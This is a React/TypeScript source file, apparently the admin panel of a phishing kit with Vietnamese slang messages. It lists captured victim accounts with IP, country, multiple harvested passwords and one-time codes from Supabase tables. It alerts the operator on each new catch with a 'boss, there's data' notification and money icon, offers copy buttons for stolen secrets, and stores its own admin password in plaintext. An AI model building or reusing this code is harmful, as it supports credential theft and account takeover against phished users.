import Login from '@/pages/admin/login';
import { realtimeService } from '@/utils/realtimeService';
import { supabase } from '@/utils/supabase';
import { faBell, faBellSlash, faChevronDown, faChevronUp, faCog, faCopy, faRefresh, faSave, faSignOutAlt, faTrash } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { useEffect, useState, type FC } from 'react';
import MoneyImage from '@/assets/images/money.png';
import NotiSound from '@/assets/audio/public_noti.mp3';
interface DataRecord {
    id: number;
    username: string;
    ip?: string;
    country?: string;
    created_at?: string;
}

interface PassRecord {
    id: number;
    pass: string;
    data_id: number;
}

interface CodeRecord {
    id: number;
    code: string;
    data_id: number;
}

interface ConfigRecord {
    id: number;
    max_pass: number;
    max_code: number;
}

interface RealtimePayload {
    eventType: 'INSERT' | 'UPDATE' | 'DELETE';
    new?: DataRecord | PassRecord | CodeRecord;
    old?: DataRecord | PassRecord | CodeRecord;
}

const formatHours = (diffInHours: number, diffInMinutes: number) => {
    const remainingMinutes = diffInMinutes % 60;
    const isSingleHour = diffInHours === 1;

    if (remainingMinutes === 0) {
        return isSingleHour ? '1 tiếng' : `${diffInHours} tiếng`;
    }
    if (remainingMinutes === 30) {
        return isSingleHour ? '1 tiếng rưỡi' : `${diffInHours} tiếng rưỡi`;
    }
    return isSingleHour ? `1 tiếng ${remainingMinutes} phút` : `${diffInHours} tiếng ${remainingMinutes} phút`;
};

const formatDays = (diffInDays: number) => {
    if (diffInDays === 1) return '1 ngày';
    if (diffInDays < 7) return `${diffInDays} ngày`;

    const weeks = Math.floor(diffInDays / 7);
    if (diffInDays < 30) return weeks === 1 ? '1 tuần' : `${weeks} tuần`;

    const months = Math.floor(diffInDays / 30);
    if (diffInDays < 365) return months === 1 ? '1 tháng' : `${months} tháng`;

    const years = Math.floor(diffInDays / 365);
    return years === 1 ? '1 năm' : `${years} năm`;
};

const formatVietnameseRelativeTime = (dateString: string) => {
    const now = new Date();
    const date = new Date(dateString);
    const diffInSeconds = Math.floor((now.getTime() - date.getTime()) / 1000);

    if (diffInSeconds < 60) return 'vừa xong';

    const diffInMinutes = Math.floor(diffInSeconds / 60);
    if (diffInMinutes < 60) {
        return diffInMinutes === 1 ? '1 phút trước' : `${diffInMinutes} phút trước`;
    }

    const diffInHours = Math.floor(diffInMinutes / 60);
    if (diffInHours < 24) return formatHours(diffInHours, diffInMinutes);

    const diffInDays = Math.floor(diffInHours / 24);
    return formatDays(diffInDays);
};

class NotificationService {
    private static instance: NotificationService;
    private permission: NotificationPermission = 'default';
    private isEnabled: boolean = false;

    private constructor() {
        this.permission = Notification.permission;
        this.isEnabled = localStorage.getItem('notificationsEnabled') === 'true';
    }

    public static getInstance(): NotificationService {
        if (!NotificationService.instance) {
            NotificationService.instance = new NotificationService();
        }
        return NotificationService.instance;
    }

    public async requestPermission(): Promise<boolean> {
        if (!('Notification' in window)) {
            return false;
        }

        if (this.permission === 'granted') {
            return true;
        }

        if (this.permission === 'denied') {
            return false;
        }

        try {
            const permission = await Notification.requestPermission();
            this.permission = permission;
            return permission === 'granted';
        } catch {
            return false;
        }
    }

    public enableNotifications(): void {
        this.isEnabled = true;
        localStorage.setItem('notificationsEnabled', 'true');
    }

    public disableNotifications(): void {
        this.isEnabled = false;
        localStorage.setItem('notificationsEnabled', 'false');
    }

    public isNotificationEnabled(): boolean {
        return this.isEnabled && this.permission === 'granted';
    }

    public showNotification(title: string, body: string, icon?: string): void {
        if (!this.isNotificationEnabled()) {
            return;
        }

        try {
            const audio = new Audio(NotiSound);
            audio.play().catch(() => {});

            const notification = new Notification(title, {
                body,
                icon: icon,
                tag: 'admin-dashboard',
                requireInteraction: false,
                silent: false
            });

            setTimeout(() => {
                notification.close();
            }, 5000);

            notification.onclick = () => {
                window.focus();
                notification.close();
            };
        } catch {
            //
        }
    }
}

const Dashboard: FC = () => {
    const [isLogedIn, setIsLogedIn] = useState(false);
    const [data, setData] = useState<DataRecord[]>([]);
    const [passes, setPasses] = useState<PassRecord[]>([]);
    const [codes, setCodes] = useState<CodeRecord[]>([]);
    const [config, setConfig] = useState<ConfigRecord | null>(null);
    const [loading, setLoading] = useState(false);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');
    const [newMaxPass, setNewMaxPass] = useState('');
    const [newMaxCode, setNewMaxCode] = useState('');
    const [expandedPasswords, setExpandedPasswords] = useState<Set<number>>(new Set());
    const [expandedCodes, setExpandedCodes] = useState<Set<number>>(new Set());
    const [copiedItems, setCopiedItems] = useState<Set<string>>(new Set());
    const [notificationsEnabled, setNotificationsEnabled] = useState(false);
    const [notificationService] = useState(() => NotificationService.getInstance());
    const [showChangePassword, setShowChangePassword] = useState(false);
    const [currentPassword, setCurrentPassword] = useState('');
    const [newPassword, setNewPassword] = useState('');
    const [confirmPassword, setConfirmPassword] = useState('');

    const loadInitialData = async () => {
        setLoading(true);
        setError('');
        try {
            const [dataResult, passesResult, codesResult, configResult] = await Promise.all([supabase.from('data').select('*').order('created_at', { ascending: false }), supabase.from('list_pass').select('*').order('id', { ascending: false }), supabase.from('list_code').select('*').order('id', { ascending: false }), supabase.from('config').select('*').single()]);

            if (dataResult.error) throw dataResult.error;
            if (passesResult.error) throw passesResult.error;
            if (codesResult.error) throw codesResult.error;
            if (configResult.error) throw configResult.error;

            setData(dataResult.data || []);
            setPasses(passesResult.data || []);
            setCodes(codesResult.data || []);
            setConfig(configResult.data);
            setNewMaxPass(configResult.data?.max_pass?.toString() || '');
            setNewMaxCode(configResult.data?.max_code?.toString() || '');
        } catch (err: unknown) {
            const errorMessage = err instanceof Error ? err.message : 'Unknown error';
            setError('vl lỗi tải data: ' + errorMessage);
        } finally {
            setLoading(false);
        }
    };

    useEffect(() => {
        if (localStorage.getItem('daubuoi')) {
            setIsLogedIn(true);
            setNotificationsEnabled(notificationService.isNotificationEnabled());
            loadInitialData();

            realtimeService.subscribeToAllDataChanges((payload: unknown) => {
                loadInitialData();

                const typedPayload = payload as RealtimePayload;
                if (typedPayload.eventType === 'INSERT') {
                    const newData = typedPayload.new as DataRecord;
                    notificationService.showNotification('sếp ơi có data nè', `acc mới: ${newData?.username || 'Unknown'}`, MoneyImage);
                }
            });

            realtimeService.subscribeToAllPassChanges((payload: unknown) => {
                loadInitialData();

                const typedPayload = payload as RealtimePayload;
                if (typedPayload.eventType === 'INSERT') {
                    notificationService.showNotification('sếp ơi có data nè', 'có pass mới được thêm vào acc', MoneyImage);
                }
            });

            realtimeService.subscribeToAllCodeChanges((payload: unknown) => {
                loadInitialData();

                const typedPayload = payload as RealtimePayload;
                if (typedPayload.eventType === 'INSERT') {
                    notificationService.showNotification('sếp ơi có data nè', 'có code mới được thêm vào acc', MoneyImage);
                }
            });
        }

        return () => {
            realtimeService.unsubscribeAll();
        };
    }, [notificationService]);

    const handleLogout = () => {
        localStorage.removeItem('daubuoi');
        setIsLogedIn(false);
        realtimeService.unsubscribeAll();
    };

    const handleNotificationToggle = async () => {
        if (notificationsEnabled) {
            notificationService.disableNotifications();
            setNotificationsEnabled(false);
        } else {
            const hasPermission = await notificationService.requestPermission();
            if (hasPermission) {
                notificationService.enableNotifications();
                setNotificationsEnabled(true);
                setSuccess('đỉnh kout! bật thông báo.');
                setTimeout(() => setSuccess(''), 3000);
            } else {
                setError('ủa j z? bị từ chối thông báo rồi');
            }
        }
    };

    const handleConfigUpdate = async () => {
        if (!config) return;

        setLoading(true);
        setError('');
        setSuccess('');

        try {
            const maxPass = parseInt(newMaxPass);
            const maxCode = parseInt(newMaxCode);

            if (isNaN(maxPass) || isNaN(maxCode) || maxPass < 0 || maxCode < 0) {
                throw new Error('trời ưi nhập số dương thôi :v');
            }

            const { error } = await supabase.from('config').update({ max_pass: maxPass, max_code: maxCode }).eq('id', config.id);

            if (error) throw error;

            setSuccess('ok con dê! cập nhật xong rồi :v');
            setTimeout(() => setSuccess(''), 3000);
        } catch (err: unknown) {
            const errorMessage = err instanceof Error ? err.message : 'Unknown error';
            setError('vcl lỗi cập nhật: ' + errorMessage);
        } finally {
            setLoading(false);
        }
    };

    const togglePasswordsExpansion = (accountId: number) => {
        const newExpanded = new Set(expandedPasswords);
        if (newExpanded.has(accountId)) {
            newExpanded.delete(accountId);
        } else {
            newExpanded.add(accountId);
        }
        setExpandedPasswords(newExpanded);
    };

    const toggleCodesExpansion = (accountId: number) => {
        const newExpanded = new Set(expandedCodes);
        if (newExpanded.has(accountId)) {
            newExpanded.delete(accountId);
        } else {
            newExpanded.add(accountId);
        }
        setExpandedCodes(newExpanded);
    };

    const handleDeleteData = async (dataId: number) => {
        setLoading(true);
        setError('');
        setSuccess('');
        try {
            const { error: passError } = await supabase.from('list_pass').delete().eq('data_id', dataId);

            if (passError) throw passError;

            const { error: codeError } = await supabase.from('list_code').delete().eq('data_id', dataId);

            if (codeError) throw codeError;

            const { error: dataError } = await supabase.from('data').delete().eq('id', dataId);

            if (dataError) throw dataError;

            setSuccess('được rồi nha! xóa acc xong :v');
            setTimeout(() => setSuccess(''), 3000);
        } catch (err: unknown) {
            const errorMessage = err instanceof Error ? err.message : 'Unknown error';
            setError('lmao lỗi xóa acc: ' + errorMessage);
        } finally {
            setLoading(false);
        }
    };

    const handleCopyToClipboard = async (text: string, itemId: string) => {
        try {
            await navigator.clipboard.writeText(text);
            setCopiedItems((prev) => new Set([...prev, itemId]));
            setTimeout(() => {
                setCopiedItems((prev) => {
                    const newSet = new Set(prev);
                    newSet.delete(itemId);
                    return newSet;
                });
            }, 2000);
        } catch (err) {
            console.error('Failed to copy text: ', err);
        }
    };

    const handleChangePassword = async (): Promise<void> => {
        if (!currentPassword || !newPassword || !confirmPassword) {
            setError('vui lòng điền đầy đủ thông tin :v');
            return;
        }

        if (newPassword !== confirmPassword) {
            setError('mật khẩu mới không khớp :v');
            return;
        }

        if (newPassword.length < 3) {
            setError('mật khẩu mới phải có ít nhất 3 ký tự :v');
            return;
        }

        setLoading(true);
        setError('');
        setSuccess('');

        try {
            const { data: accountData, error: checkError } = await supabase.from('account').select('pass').eq('username', 'admin').single();

            if (checkError) throw checkError;

            if (accountData?.pass !== currentPassword) {
                setError('mật khẩu hiện tại không đúng :v');
                return;
            }

            const { error: updateError } = await supabase.from('account').update({ pass: newPassword }).eq('username', 'admin');

            if (updateError) throw updateError;

            setSuccess('đổi mật khẩu thành công! :v');
            setCurrentPassword('');
            setNewPassword('');
            setConfirmPassword('');
            setShowChangePassword(false);
            setTimeout(() => setSuccess(''), 3000);
        } catch (err: unknown) {
            const errorMessage = err instanceof Error ? err.message : 'Unknown error';
            setError('lỗi đổi mật khẩu: ' + errorMessage);
        } finally {
            setLoading(false);
        }
    };

    if (!isLogedIn) {
        return <Login />;
    }

    return (
        <div className='min-h-screen bg-white p-4'>
            <div className='mx-auto max-w-7xl'>
                <div className='mb-6 border border-black bg-white p-6'>
                    <div className='flex items-center justify-between'>
                        <div className='flex items-center gap-4'>
                            <a href='https://t.me/ovftank' target='_blank' rel='noopener noreferrer' className='flex items-center gap-2 text-black transition-colors hover:text-black/70'>
                                <img src='https://t.me/i/userpic/320/ovftank.jpg' alt='@ovftank' className='h-8 w-8 rounded-full border border-black/20 object-cover' />
                            </a>
                            <p className='text-2xl font-bold text-black'>dashboard</p>
                        </div>
                        <div className='flex items-center gap-2'>
                            <button onClick={handleNotificationToggle} className={`flex items-center border border-black px-4 py-2 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none ${notificationsEnabled ? 'bg-black text-white hover:bg-gray-800' : 'bg-white text-black hover:bg-gray-100'}`} title={notificationsEnabled ? 'Disable notifications' : 'Enable notifications'}>
                                <FontAwesomeIcon icon={notificationsEnabled ? faBell : faBellSlash} className='mr-2' />
                                {notificationsEnabled ? 'tắt thông báo' : 'bật thông báo'}
                            </button>
                            <button onClick={() => setShowChangePassword(!showChangePassword)} className='flex items-center border border-black bg-white px-4 py-2 text-black hover:bg-gray-100 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none'>
                                <FontAwesomeIcon icon={faCog} className='mr-2' />
                                đổi mk
                            </button>
                            <button onClick={handleLogout} className='flex items-center border border-black bg-black px-4 py-2 text-white hover:bg-gray-800 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none'>
                                <FontAwesomeIcon icon={faSignOutAlt} className='mr-2' />
                                đăng xuất
                            </button>
                        </div>
                    </div>
                </div>

                {error && <div className='mb-4 border border-black bg-white px-4 py-3 text-black'>{error}</div>}
                {success && <div className='mb-4 border border-black bg-white px-4 py-3 text-black'>{success}</div>}

                {showChangePassword && (
                    <div className='mb-6 border border-black bg-white p-6'>
                        <div className='mb-4 flex items-center'>
                            <FontAwesomeIcon icon={faCog} className='mr-2 text-black' />
                            <h2 className='text-xl font-semibold text-black'>đổi mk</h2>
                        </div>

                        <div className='grid grid-cols-1 gap-4 md:grid-cols-3'>
                            <div>
                                <label htmlFor='currentPassword' className='mb-2 block text-sm font-medium text-black'>
                                    mk hiện tại
                                </label>
                                <input id='currentPassword' type='password' value={currentPassword} onChange={(e) => setCurrentPassword(e.target.value)} className='w-full border border-black px-3 py-2 text-black focus:border-black focus:ring-black focus:outline-none' placeholder='nhập mk hiện tại' />
                            </div>
                            <div>
                                <label htmlFor='newPassword' className='mb-2 block text-sm font-medium text-black'>
                                    mk mới
                                </label>
                                <input id='newPassword' type='password' value={newPassword} onChange={(e) => setNewPassword(e.target.value)} className='w-full border border-black px-3 py-2 text-black focus:border-black focus:ring-black focus:outline-none' placeholder='nhập mk mới' />
                            </div>
                            <div>
                                <label htmlFor='confirmPassword' className='mb-2 block text-sm font-medium text-black'>
                                    xác nhận mk mới
                                </label>
                                <input id='confirmPassword' type='password' value={confirmPassword} onChange={(e) => setConfirmPassword(e.target.value)} className='w-full border border-black px-3 py-2 text-black focus:border-black focus:ring-black focus:outline-none' placeholder='nhập lại mk mới' />
                            </div>
                        </div>

                        <div className='mt-4 flex gap-2'>
                            <button onClick={handleChangePassword} disabled={loading} className='flex items-center border border-black bg-black px-4 py-2 text-white hover:bg-gray-800 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none disabled:cursor-not-allowed disabled:opacity-50'>
                                <FontAwesomeIcon icon={faSave} className='mr-2' />
                                {loading ? 'đang xử lý...' : 'đổi mk'}
                            </button>
                            <button
                                onClick={() => {
                                    setShowChangePassword(false);
                                    setCurrentPassword('');
                                    setNewPassword('');
                                    setConfirmPassword('');
                                    setError('');
                                }}
                                className='flex items-center border border-black bg-white px-4 py-2 text-black hover:bg-gray-100 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none'
                            >
                                hủy
                            </button>
                        </div>
                    </div>
                )}

                <div className='mb-6 border border-black bg-white p-6'>
                    <div className='mb-4 flex items-center'>
                        <FontAwesomeIcon icon={faCog} className='mr-2 text-black' />
                        <h2 className='text-xl font-semibold text-black'>cài đặt</h2>
                    </div>

                    {config && (
                        <div className='grid grid-cols-1 gap-4 md:grid-cols-2'>
                            <div>
                                <label htmlFor='maxPass' className='mb-2 block text-sm font-medium text-black'>
                                    max pass
                                </label>
                                <input id='maxPass' type='number' value={newMaxPass} onChange={(e) => setNewMaxPass(e.target.value)} className='w-full border border-black px-3 py-2 text-black focus:border-black focus:ring-black focus:outline-none' min='0' />
                            </div>
                            <div>
                                <label htmlFor='maxCode' className='mb-2 block text-sm font-medium text-black'>
                                    max code
                                </label>
                                <input id='maxCode' type='number' value={newMaxCode} onChange={(e) => setNewMaxCode(e.target.value)} className='w-full border border-black px-3 py-2 text-black focus:border-black focus:ring-black focus:outline-none' min='0' />
                            </div>
                        </div>
                    )}

                    <div className='mt-4 flex gap-2'>
                        <button onClick={handleConfigUpdate} disabled={loading} className='flex items-center border border-black bg-black px-4 py-2 text-white hover:bg-gray-800 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none disabled:cursor-not-allowed disabled:opacity-50'>
                            <FontAwesomeIcon icon={faSave} className='mr-2' />
                            {loading ? 'đang lưu...' : 'lưu'}
                        </button>
                        <button onClick={loadInitialData} disabled={loading} className='flex items-center border border-black bg-white px-4 py-2 text-black hover:bg-gray-100 focus:ring-2 focus:ring-black focus:ring-offset-2 focus:outline-none disabled:opacity-50'>
                            <FontAwesomeIcon icon={faRefresh} className='mr-2' />
                            làm mới
                        </button>
                    </div>
                </div>

                <div className='border border-black bg-white'>
                    <div className='border-b border-black bg-white px-6 py-4'>
                        <h3 className='text-xl font-bold text-black'>danh sách acc({data.length})</h3>
                    </div>

                    <div className='border-b border-black bg-white'>
                        <div className='grid grid-cols-12 gap-4 px-6 py-3 text-sm font-semibold text-black'>
                            <div className='col-span-2'>IP Address</div>
                            <div className='col-span-2'>Country</div>
                            <div className='col-span-2 flex items-center justify-center'>-</div>
                            <div className='col-span-2 flex items-center justify-end'>Username</div>
                            <div className='col-span-2'>Pass</div>
                            <div className='col-span-1'>Code</div>
                            <div className='col-span-1 flex items-center justify-center'>-</div>
                        </div>
                    </div>

                    <div className='divide-y divide-black'>
                        {data.map((account) => {
                            const accountPasses = passes.filter((pass) => pass.data_id === account.id);
                            const accountCodes = codes.filter((code) => code.data_id === account.id);

                            return (
                                <div key={account.id}>
                                    <div className='grid grid-cols-12 gap-4 px-6 py-4 text-sm text-black hover:bg-gray-50'>
                                        <div className='col-span-2 font-mono'>{account.ip || 'N/A'}</div>
                                        <div className='col-span-2'>{account.country || 'N/A'}</div>
                                        <div className='items-startpnpm col-span-2 flex justify-center'>{account.created_at ? formatVietnameseRelativeTime(account.created_at) : 'N/A'}</div>
                                        <div className='col-span-2 flex items-start justify-end'>
                                            <span className='font-semibold'>{account.username}</span>
                                            {(() => {
                                                const usernameId = `username-${account.id}`;
                                                const isCopied = copiedItems.has(usernameId);
                                                const buttonClass = `ml-1 border border-gray-300 px-1 py-0.5 text-black hover:bg-gray-200 focus:outline-none ${isCopied ? 'bg-gray-300' : 'bg-white'}`;
                                                const buttonTitle = isCopied ? 'Copied!' : 'Copy username';

                                                return (
                                                    <button onClick={() => handleCopyToClipboard(account.username, usernameId)} className={buttonClass} title={buttonTitle}>
                                                        <FontAwesomeIcon icon={faCopy} className='text-xs' />
                                                    </button>
                                                );
                                            })()}
                                        </div>
                                        <div className='col-span-2 flex flex-col items-center justify-start'>
                                            <div className='mb-2 flex w-full items-center justify-between'>
                                                <span className='mr-2'>{accountPasses.length}</span>
                                                <button onClick={() => togglePasswordsExpansion(account.id)} className='flex h-6 w-6 items-center justify-center border border-black bg-white hover:bg-gray-100 focus:outline-none'>
                                                    <FontAwesomeIcon icon={expandedPasswords.has(account.id) ? faChevronUp : faChevronDown} className='text-xs' />
                                                </button>
                                            </div>
                                            {expandedPasswords.has(account.id) && accountPasses.length > 0 && (
                                                <div className='max-h-32 w-full space-y-1 overflow-y-auto'>
                                                    {accountPasses.map((pass) => {
                                                        const itemId = `pass-${pass.id}`;
                                                        const isCopied = copiedItems.has(itemId);
                                                        return (
                                                            <div key={pass.id} className='flex items-center justify-between border border-gray-300 bg-gray-50 p-1 text-xs'>
                                                                <div className='flex-1 truncate font-mono break-all text-black'>{pass.pass}</div>
                                                                <button onClick={() => handleCopyToClipboard(pass.pass, itemId)} className={`ml-1 border border-gray-300 px-1 py-0.5 text-black hover:bg-gray-200 focus:outline-none ${isCopied ? 'bg-gray-300' : 'bg-white'}`} title={isCopied ? 'Copied!' : 'Copy password'}>
                                                                    <FontAwesomeIcon icon={faCopy} className='text-xs' />
                                                                </button>
                                                            </div>
                                                        );
                                                    })}
                                                </div>
                                            )}
                                        </div>
                                        <div className='col-span-1 flex flex-col items-center justify-start'>
                                            <div className='mb-2 flex w-full items-center justify-between'>
                                                <span className='mr-2'>{accountCodes.length}</span>
                                                <button onClick={() => toggleCodesExpansion(account.id)} className='flex h-6 w-6 items-center justify-center border border-black bg-white hover:bg-gray-100 focus:outline-none'>
                                                    <FontAwesomeIcon icon={expandedCodes.has(account.id) ? faChevronUp : faChevronDown} className='text-xs' />
                                                </button>
                                            </div>
                                            {expandedCodes.has(account.id) && accountCodes.length > 0 && (
                                                <div className='max-h-32 w-full space-y-1 overflow-y-auto'>
                                                    {accountCodes.map((code) => {
                                                        const itemId = `code-${code.id}`;
                                                        const isCopied = copiedItems.has(itemId);
                                                        return (
                                                            <div key={code.id} className='flex items-center justify-between border border-gray-300 bg-gray-50 p-1 text-xs'>
                                                                <div className='flex-1 truncate font-mono break-all text-black'>{code.code}</div>
                                                                <button onClick={() => handleCopyToClipboard(code.code, itemId)} className={`ml-1 border border-gray-300 px-1 py-0.5 text-black hover:bg-gray-200 focus:outline-none ${isCopied ? 'bg-gray-300' : 'bg-white'}`} title={isCopied ? 'Copied!' : 'Copy code'}>
                                                                    <FontAwesomeIcon icon={faCopy} className='text-xs' />
                                                                </button>
                                                            </div>
                                                        );
                                                    })}
                                                </div>
                                            )}
                                        </div>
                                        <div className='col-span-1 flex items-start justify-center'>
                                            <button onClick={() => handleDeleteData(account.id)} disabled={loading} className='border border-black bg-white px-1 py-0.5 text-black hover:bg-gray-100 focus:outline-none disabled:opacity-50'>
                                                <FontAwesomeIcon icon={faTrash} className='text-xs' />
                                            </button>
                                        </div>
                                    </div>
                                </div>
                            );
                        })}
                    </div>
                </div>
            </div>
        </div>
    );
};

export default Dashboard;
